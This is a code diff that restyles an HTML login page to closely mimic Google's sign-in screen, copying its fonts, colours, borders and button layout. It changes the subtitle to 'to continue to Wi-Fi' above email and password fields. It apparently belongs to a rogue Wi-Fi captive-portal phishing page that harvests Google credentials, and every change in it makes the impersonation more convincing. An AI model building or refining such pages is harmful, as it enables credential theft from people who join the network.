@@ -7,46 +7,63 @@
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            font-family: "Google Sans", "Noto Sans Myanmar UI", arial, sans-serif;
         }
         body {
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background-color: #f1f1f1;
+            background-color: #fff;
         }
         .login-container {
             background-color: #fff;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            width: 100%;
+            max-width: 450px;
+            margin: 20px;
         }
         #logo {
             display: block;
-            margin: 0 auto 20px;
-        }
-        h1, h2 {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        h2 {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 30px;
         }
         .g-input {
             display: block;
             width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            padding: 13px 15px;
+            margin-bottom: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline-color: #1a73e8;
+            font-size: 16px;
         }
         .gbtn-primary {
             display: block;
-            width: 100%;
-            padding: 10px;
+            float: right;
+            padding: 10px 24px;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             background-color: #1a73e8;
             color: #fff;
             cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+            margin-top: 10px;
         }
     </style>
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
@@ -65,7 +82,7 @@
                 </svg>
             </div>
             <h1>Sign in</h1>
-            <h2>Use your Google Account</h2>
+            <h2>to continue to Wi-Fi</h2>
             <input name="email" type="text" class="g-input" placeholder="Email" required>
             <input name="password" type="password" class="g-input" placeholder="Password" required>
             <button class="gbtn-primary" type="submit">Next</button>
